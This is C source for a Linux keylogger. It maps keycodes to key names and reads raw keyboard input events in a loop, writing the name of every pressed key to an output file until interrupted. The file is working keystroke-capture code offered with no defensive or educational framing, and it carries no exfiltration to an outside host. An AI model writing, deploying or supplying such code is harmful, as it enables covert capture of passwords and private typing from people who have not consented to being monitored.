#include <linux/input.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include "keylogger.h"

#define BUFFER_SIZE 100
#define NUM_KEYCODES 71

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

int loop = 1;

void sigint_handler(int sig){
    loop = 0;
}

void keylogger(int keyboard, FILE *writeout){
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int i;

    signal(SIGINT, sigint_handler);

    while(loop){
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

        for(i = 0; i < (bytesRead / eventSize); ++i){
            if(events[i].type == EV_KEY){
                if(events[i].value == 1){
                    if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
                        fprintf(writeout, "%s\n", keycodes[events[i].code]);
                    }
                    else{
                        fprintf(writeout, "%s\n", "KEY_UNRECOGNIZED");
                    }
                }
            }
        }
    }

    close(keyboard);
    fclose(writeout);
}
